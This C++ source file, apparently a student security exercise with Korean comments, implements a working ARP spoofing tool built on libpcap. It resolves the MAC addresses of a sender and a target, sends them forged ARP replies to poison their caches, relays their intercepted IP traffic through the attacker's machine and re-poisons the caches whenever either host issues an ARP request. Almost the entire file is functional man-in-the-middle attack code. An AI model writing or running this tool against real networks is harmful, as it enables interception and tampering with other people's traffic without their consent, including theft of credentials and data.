#include <cstdio>
#include <pcap.h>
#include <string>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include <thread>
#include <vector>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IpHeader {

	// ethernet
	EthHdr eth_;

	// IP
	uint8_t ip_v_hl; // ip Version and Header Length
	uint8_t ip_tos; // ip type of service
	uint16_t ip_total_length; // ip total length, 2byte
	uint16_t ip_id; // ip Identification, 2byte
	uint16_t ip_flag_frag; // ip flags, fragment offset, 2byte
	uint8_t ip_ttl; // ip TTL

	uint8_t ip_proto_type; // ip protocol type

	uint16_t ip_h_ck; // ip header checksum, 2byte

	uint32_t ip_src; // source ip address
	uint32_t ip_dst; // destination ip address
	
};

void usage();
void getMacAddress(char* ifaceName, char* macAddressStr);
void getIPAddress(char* ifaceName, char* ipAddressStr);
void printArpInfo(EthArpPacket pkt);

EthArpPacket MakeArpPacket(char arp_type, Mac dmac, Mac smac, Mac arp_smac, Ip sip, Mac tmac, Ip tip);
EthArpPacket sendArpRequest(pcap_t* handle, char* sip, char* smac, char* tip);
void sendArpReply(pcap_t* handle, char* smac, Ip sip, Mac tmac, Ip tip);
void arpReplyThread(pcap_t* handle, char* smac, Ip sip, Mac tmac, Ip tip);



int main(int argc, char* argv[]) {

	// 인수 전달이 잘못되면 usage() 출력
	if (argc < 3) {
		usage();
		return 1;
	}

	char* ifname = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
		return -1;
	}

	char my_mac_addr[18];
	char my_ip_addr[20];
	getMacAddress(ifname, my_mac_addr);
	getIPAddress(ifname, my_ip_addr);

	// 1. sender와 target들에게 arp request를 보내서 mac addr을 확보한다.
	EthArpPacket* arpReplyPkt = new EthArpPacket[argc - 2];
	int count = 0;
	for (int i = 2; i < argc; i++) {
		arpReplyPkt[count] = sendArpRequest(handle, my_ip_addr, my_mac_addr, argv[i]);
		count++;
	}
	

	// 2. sender와 target에게 변조 arp request를 보내서 감염시킨다.
	/*
	std::vector<std::thread> arpThreads;
	for (int i = 2; i < argc; i += 2) {
		char* sender_ip = argv[i];
		char* target_ip = argv[i + 1];

		Mac sender_mac = arpReplyPkt[i - 2].eth_.smac_;
		Mac target_mac = arpReplyPkt[i - 1].eth_.smac_;

		arpThreads.emplace_back(arpReplyThread, handle, my_mac_addr, sender_ip, target_mac, target_ip);
		arpThreads.emplace_back(arpReplyThread, handle, my_mac_addr, target_ip, sender_mac, sender_ip);
	}
	for (auto& thread : arpThreads) {
		thread.join();
	}
	*/
	
	for (int i = 2; i < argc; i += 2) {
		
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i + 1]);

		Mac sender_mac = arpReplyPkt[i - 2].eth_.smac_;
		Mac target_mac = arpReplyPkt[i - 1].eth_.smac_;


		for (int j = 0; j < 5; j++) {
			sendArpReply(handle, my_mac_addr, sender_ip, target_mac, target_ip); // looks like sender -> target
			sendArpReply(handle, my_mac_addr, target_ip, sender_mac, sender_ip); // looks like target -> sender
		}

	}
	
		

	// 3. sender와 target이 보내는 패킷을 릴레이하고, 동시에 sender와 target이 보내는 arp 요청을 파악해서 재감염시킨다.
	IpHeader* capturePkt;
	EthArpPacket* captureArpPkt;
	int ret;
	int res;
	// std::string sender_ip;
	// std::string target_ip;
	Ip sender_ip;
	Ip target_ip;
	Mac sender_mac;
	Mac target_mac;
	int pkt_size;

	struct pcap_pkthdr* header;
	const u_char* packet;

	while (true) {

		ret = pcap_next_ex(handle, &header, &packet);
		if (ret == 1) {
			capturePkt = reinterpret_cast<IpHeader*>(const_cast<u_char*>(packet));
			pkt_size = header->caplen;
		}

		// packet filtering
		for (int i = 2; i < argc; i += 2) {
			sender_ip = Ip(argv[i]);
			target_ip = Ip(argv[i + 1]);

			sender_mac = arpReplyPkt[i - 2].eth_.smac_;
			target_mac = arpReplyPkt[i - 1].eth_.smac_;

			if ((ntohs(capturePkt->eth_.type_) == 0x0806)) { // arp 패킷인 경우
				captureArpPkt = reinterpret_cast<EthArpPacket*>(capturePkt);
				// printArpInfo(*captureArpPkt);
				
				printf("sip: %s\n", std::string(Ip(ntohl(captureArpPkt->arp_.sip_))).c_str());
				printf("sender ip: %s\n", std::string(sender_ip).c_str());
				printf("target ip: %s\n", std::string(target_ip).c_str());
				
				// sender가 arp request를 하면 target이 풀림.
				if (Ip(ntohl(captureArpPkt->arp_.sip_)) == sender_ip) {
					puts("resend arp reply to target");
					for (int k = 0; k < 3; k++)
						sendArpReply(handle, my_mac_addr, sender_ip, target_mac, target_ip); // looks like sender -> target
				} // target이 arp request를 하면 sender가 풀림.
				else if (Ip(ntohl(captureArpPkt->arp_.sip_)) == target_ip) {
					puts("resend arp reply to sender");
					for (int k = 0; k < 3; k++)
						sendArpReply(handle, my_mac_addr, target_ip, sender_mac, sender_ip); // looks like target -> sender
				}

			}
			else if (capturePkt->eth_.smac_ == sender_mac && capturePkt->eth_.dmac_ == Mac(my_mac_addr) ) { // sender -> target으로 보내는 ip 패킷을 릴레이
				// && Ip(ntohl(capturePkt->ip_dst)) == target_ip
				printf("ip_dst: %s\n", std::string(Ip(ntohl(capturePkt->ip_dst))).c_str());
				capturePkt->eth_.smac_ = Mac(my_mac_addr);
				capturePkt->eth_.dmac_ = target_mac;

				puts("packet relay sender -> target");
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(capturePkt), pkt_size);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}

			}
			else if (capturePkt->eth_.smac_ == target_mac && capturePkt->eth_.dmac_ == Mac(my_mac_addr) ) { // target -> sender로 보내는 ip 패킷을 릴레이
				// && Ip(ntohl(capturePkt->ip_dst)) == sender_ip
				printf("ip_dst: %s\n", std::string(Ip(ntohl(capturePkt->ip_dst))).c_str());
				capturePkt->eth_.smac_ = Mac(my_mac_addr);
				capturePkt->eth_.dmac_ = sender_mac;

				puts("packet relay target -> sender");
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(capturePkt), pkt_size);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}

			}

			

			
			

		}
		

	}

	

	

	// 메모리 반환(프로그램 종료 시)
	delete[] arpReplyPkt;
	pcap_close(handle);

}

void arpReplyThread(pcap_t* handle, char* smac, Ip sip, Mac tmac, Ip tip) {
	while (true) {
		sendArpReply(handle, smac, sip, tmac, tip);
		std::this_thread::sleep_for(std::chrono::seconds(2)); // Wait for 2 seconds
	}
}

void sendArpReply(pcap_t* handle, char* smac, Ip sip, Mac tmac, Ip tip) {

	// arp reply pkt
	EthArpPacket reply;

	// MakeArpPacket: arp_type, dmac, smac, arp_smac, sip, tmac, tip
	reply = MakeArpPacket('p',
		Mac(tmac),
		Mac(smac),
		Mac(smac),
		sip,
		tmac,
		tip
	);

	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&reply), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

}


EthArpPacket sendArpRequest(pcap_t* handle, char* sip, char* smac, char* tip) {

	// arp request pkt
	EthArpPacket request;

	// MakeArpPacket: arp_type, dmac, smac, arp_smac, sip, tmac, tip
	request = MakeArpPacket('q',
		Mac("FF:FF:FF:FF:FF:FF"),
		Mac(smac),
		Mac(smac),
		Ip(sip),
		Mac("00:00:00:00:00:00"),
		Ip(tip)
	);

	struct pcap_pkthdr* header;
	const u_char* packet;
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}


	EthArpPacket* capture;
	int ret;
	while (true) {
		ret = pcap_next_ex(handle, &header, &packet);
		if (ret == 1) {
			capture = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
		}
		else
			continue;

		if ((ntohs(capture->eth_.type_) == 0x0806) && (ntohs(capture->arp_.op_) == ArpHdr::Reply)) {
			break;
		}

	}
	printArpInfo(*capture);
	return (*capture);

}

EthArpPacket MakeArpPacket(char arp_type, Mac dmac, Mac smac, Mac arp_smac, Ip sip, Mac tmac, Ip tip) {

	EthArpPacket res;
	res.eth_.dmac_ = dmac;

	res.eth_.smac_ = smac;

	res.eth_.type_ = htons(EthHdr::Arp);

	res.arp_.hrd_ = htons(ArpHdr::ETHER);
	res.arp_.pro_ = htons(EthHdr::Ip4);
	res.arp_.hln_ = Mac::SIZE;
	res.arp_.pln_ = Ip::SIZE;

	switch (arp_type) {
	case 'q':
		res.arp_.op_ = htons(ArpHdr::Request);
		break;
	case 'p':
		res.arp_.op_ = htons(ArpHdr::Reply);
		break;
	default:
		res.arp_.op_ = htons(ArpHdr::Request);
		break;
	}

	res.arp_.smac_ = arp_smac; // source mac (self)
	res.arp_.sip_ = htonl(sip); // source ip (self)
	res.arp_.tmac_ = tmac; // target mac (00:)
	res.arp_.tip_ = htonl(tip); // sender ip

	return res;

}

void getMacAddress(char* ifaceName, char* macAddressStr) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		perror("Error opening socket");
		exit(EXIT_FAILURE);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);


	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
		perror("Error getting MAC address");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	close(sockfd);

	unsigned char* macAddress = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	sprintf(macAddressStr, "%02X:%02X:%02X:%02X:%02X:%02X",
		macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);


}


void getIPAddress(char* ifaceName, char* ipAddressStr) {
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd == -1) {
		perror("Error opening socket");
		exit(EXIT_FAILURE);
	}

	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifaceName, IFNAMSIZ - 1);

	if (ioctl(sockfd, SIOCGIFADDR, &ifr) == -1) {
		perror("Error getting IP address");
		close(sockfd);
		exit(EXIT_FAILURE);
	}

	close(sockfd);

	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	const char* ipAddress = inet_ntop(AF_INET, &ipaddr->sin_addr, ipAddressStr, INET_ADDRSTRLEN);
	if (ipAddress == NULL) {
		perror("Error converting IP address");
		exit(EXIT_FAILURE);
	}

	//printf("%s\n", ipAddress);
	strcpy(ipAddressStr, ipAddress);

}

void printArpInfo(EthArpPacket pkt) {

	puts("Arp Packet Info");
	printf("arp op: %04x\n", ntohs(pkt.arp_.op_));
	printf("dmac: %s\n", std::string(pkt.eth_.dmac_).c_str());
	printf("smac: %s\n", std::string(pkt.eth_.smac_).c_str());
	printf("arp_smac: %s\n", std::string(pkt.arp_.smac_).c_str());
	printf("sip: %s\n", std::string(pkt.arp_.sip_).c_str());
	printf("tmac: %s\n", std::string(pkt.arp_.tmac_).c_str());
	printf("tip: %s\n\n", std::string(pkt.arp_.tip_).c_str());

}

void usage() {
	printf("syntax: arp-spoof <interface> <sender-ip> <target-ip>\n");
	printf("sample: arp-spoof wlan0 192.168.0.31 192.168.0.1\n");
}

